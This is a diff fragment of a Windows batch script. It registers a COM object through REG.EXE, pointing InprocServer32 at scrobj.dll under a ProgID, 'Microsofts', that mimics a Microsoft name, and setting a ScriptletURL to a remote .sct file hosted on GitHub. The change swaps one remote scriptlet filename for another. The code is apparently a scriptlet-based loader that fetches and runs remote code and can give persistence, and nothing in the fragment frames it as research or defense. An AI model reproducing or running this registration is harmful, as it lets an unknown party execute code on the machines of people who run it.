@@ -19,7 +19,7 @@ REG.EXE ADD %KEY2%\InprocServer32 /VE /T REG_SZ /D "C:\\WINDOWS\\system32\\scrob
 REG.EXE ADD %KEY2%\InprocServer32 /V ThreadingModel /T REG_SZ /D Apartment /F 
 
 REG.EXE ADD %KEY2%\ProgID /VE /T REG_SZ /D "Microsofts.1.00" /F
-REG.EXE ADD %KEY2%\ScriptletURL /VE /T REG_SZ /D "https://raw.githubusercontent.com/KJHIUHddwe/ooodieoo/master/ccccccc.sct" /F
+REG.EXE ADD %KEY2%\ScriptletURL /VE /T REG_SZ /D "https://raw.githubusercontent.com/KJHIUHddwe/ooodieoo/master/yyy.sct" /F
 
 REG.EXE ADD %KEY2%\VersionIndependentProgID /VE /T REG_SZ /D "Microsofts" /F
 
